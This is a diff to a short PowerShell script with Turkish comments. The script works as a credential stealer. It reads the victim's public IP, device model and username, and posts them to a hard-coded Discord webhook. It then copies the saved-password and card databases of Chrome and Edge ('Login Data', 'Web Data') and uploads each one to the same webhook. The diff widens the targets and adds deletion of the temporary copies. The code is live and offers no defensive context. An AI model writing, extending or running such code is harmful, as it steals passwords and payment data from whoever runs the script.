@@ -1,17 +1,18 @@
 $w = "https://discord.com/api/webhooks/1501992942435307532/boIQdDen1QjAWSFgQwKBBtIN7dgbleLaOn7yllPYGN_LyGNs5PouMJbdEsDZbSYN_G2A"
 
-# --- SAF VERİ ---
+# --- SAF VERİ (İP, CİHAZ, USER) ---
 $ip = (i'r'm ifconfig.me).Trim()
 $cihaz = (Get-CimInstance Win32_ComputerSystem).Model
 $kullanici = $env:USERNAME
 $mesaj = "İp $ip`nCihaz ismi $cihaz`nKullanici ismi $kullanici"
 & "curl.exe" -d "content=$mesaj" $w
 
-# --- DOSYALARI ÇEK ---
+# --- ŞİFRE VE KART DOSYALARI ---
 $paths = @(
     "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
     "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data",
-    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
 )
 
 foreach ($p in $paths) {
@@ -19,5 +20,6 @@ foreach ($p in $paths) {
         $t = "$env:TEMP\$(random).db"
         Copy-Item $p -Destination $t -Force
         & "curl.exe" -F "file=@$t" $w
+        Remove-Item $t
     }
 }
